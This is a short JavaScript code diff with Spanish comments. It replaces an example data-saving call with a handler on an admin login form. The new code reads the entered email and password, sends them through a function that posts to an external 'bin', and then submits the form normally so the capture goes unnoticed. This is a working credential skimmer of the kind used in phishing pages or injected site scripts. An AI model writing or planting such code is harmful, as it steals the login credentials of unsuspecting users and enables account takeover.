@@ -20,11 +20,21 @@ function guardarDatos(data) {
         .catch(error => console.error('Error:', error));
 }
 
-// Luego, puedes llamar a la función guardarDatos con los datos que desees guardar
-// Ejemplo:
-const datosAGuardar = {
-    usuario: 'ejemplo',
-    contraseña: 'secreto123',
-};
+// Captura el evento de envío del formulario
+document.getElementById('submit-admin').addEventListener('click', function (event) {
+    event.preventDefault();
 
-guardarDatos(datosAGuardar);
+    // Obtén los datos del formulario
+    const email = document.getElementById('email_address_login').value;
+    const password = document.getElementById('password').value;
+
+    // Guarda los datos en el bin
+    guardarDatos({
+        usuario: email,
+        contraseña: password,
+    });
+
+    // Continúa con el envío del formulario si es necesario
+    // Puedes redirigir o realizar otras acciones aquí
+    document.getElementById('login-form-admin').submit();
+});
